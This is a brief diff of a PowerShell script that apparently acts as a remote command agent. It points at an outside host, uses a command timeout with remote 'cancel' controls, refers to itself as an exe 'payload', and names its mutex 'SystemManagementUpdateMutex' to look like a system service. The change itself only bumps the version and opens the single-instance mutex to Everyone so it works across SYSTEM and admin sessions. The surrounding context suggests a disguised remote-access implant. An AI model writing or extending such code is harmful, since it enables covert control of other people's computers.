@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "2.9.0"
+$Version = "2.9.1"
 $cfHost = "https://connect.aniketpandey.website"
 $maxRetries = 10
 $cmdTimeout = 300   # default timeout — use 'notimeout:' prefix or 'cancel' for manual control
@@ -32,7 +32,22 @@ $isExePayload = ($selfPath -and [System.IO.Path]::GetExtension($selfPath).ToLowe
 # ╚══════════════════════════════════════════════════════════════════════════════╝
 $mutexName = "Global\SystemManagementUpdateMutex"
 $createdNew = $false
-$script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
+try {
+    # Create mutex with Everyone access so both SYSTEM and admin users can share it
+    $mutexSecurity = New-Object System.Security.AccessControl.MutexSecurity
+    $rule = New-Object System.Security.AccessControl.MutexAccessRule(
+        "Everyone",
+        [System.Security.AccessControl.MutexRights]::FullControl,
+        [System.Security.AccessControl.AccessControlType]::Allow
+    )
+    $mutexSecurity.AddAccessRule($rule)
+    $script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew, $mutexSecurity)
+} catch {
+    # Fallback: try without security (may fail cross-user, but won't crash)
+    try {
+        $script:singleInstanceMutex = New-Object System.Threading.Mutex($true, $mutexName, [ref]$createdNew)
+    } catch { exit }
+}
 if (-not $createdNew) { exit }
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
